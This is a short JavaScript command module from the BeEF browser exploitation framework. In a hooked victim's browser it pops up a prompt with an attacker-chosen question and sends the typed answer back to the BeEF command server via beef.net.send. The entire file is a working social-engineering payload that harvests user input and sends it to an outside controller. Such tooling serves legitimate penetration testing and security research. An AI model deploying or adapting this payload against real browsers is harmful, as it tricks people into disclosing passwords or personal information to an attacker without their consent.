//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  
//  var answer = prompt("<%== @question %>","")
//  beef.net.send('<%= @command_url %>', <%= @command_id %>, 'answer='+answer);


    var answer = prompt("<%== @question %>","");
    var result = new beef.CmdResult(
       <%= @command_id %>, //cmd_id
       beef.CmdResultEnum.SUCCESS, //status
       {"data":answer} //data
     );

    //console.log("result.data: " + result.data);
    //console.log("JSON.parse(result.data).data: " + JSON.parse(result.data).data);

    //beef.net.send('<%= @command_url %>', <%= @command_id %>, answer);
    beef.net.send('<%= @command_url %>', <%= @command_id %>, JSON.stringify(result));

    return result;
});
